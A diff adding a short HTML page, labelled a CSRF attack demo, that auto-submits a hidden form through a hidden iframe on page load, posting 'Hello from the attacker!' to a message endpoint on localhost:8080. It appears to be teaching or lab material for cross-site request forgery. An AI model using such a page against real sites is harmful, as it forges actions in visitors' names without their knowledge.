@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack Demo</title>
+    <script>
+        window.onload = function() {
+            document.getElementById('attackForm').submit();
+        };
+    </script>
+</head>
+<body>
+
+<h1>CSRF Attack Demo</h1>
+
+<iframe style="display:none;" name="hiddenFrame"></iframe>
+
+<form id="attackForm" action="http://localhost:8080/messages" method="POST" target="hiddenFrame">
+    <input type="hidden" name="message" value="Hello from the attacker!" />
+</form>
+</body>
+</html>
